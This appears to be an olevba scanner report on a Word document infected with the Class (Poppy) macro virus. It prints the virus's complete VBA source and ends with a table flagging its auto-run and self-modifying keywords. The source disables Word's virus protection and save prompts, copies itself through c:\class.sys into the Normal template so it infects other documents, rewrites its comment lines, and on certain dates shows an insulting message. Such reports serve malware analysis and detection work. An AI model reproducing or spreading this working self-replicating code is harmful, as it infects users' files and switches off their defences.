olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-1b5a30895584563fc3aa76471307841efa5d68e2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-1b5a30895584563fc3aa76471307841efa5d68e2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
On Error GoTo out
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
Options.VirusProtection = False
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
Options.SaveNormalPrompt = False
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
Options.ConfirmConversions = False
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
If nt > 70 And ad > 0 Then GoTo out
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
If nt < 70 Then
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
End If
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
host.codemodule.AddFromFile ("c:\class.sys")
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
With host.codemodule
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
    For x = 1 To 4
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
    .deletelines 1
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
    Next x
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
End With
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
If nt < 70 Then
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
    With host.codemodule
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
    .replaceline 1, "Sub AutoClose()"
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
    .replaceline 71, "Sub ToolsMacro()"
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
    End With
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
End If
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
With host.codemodule
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
    For x = 2 To 72 Step 2
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
    Next x
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
End With
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
out:
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
End Sub
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
Sub ViewVBCode()
'Admin16.12.2002 10:00:30\\UNIGE-TREE\pq-mail3183-hp-a on NE00:161202.docTrombine
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

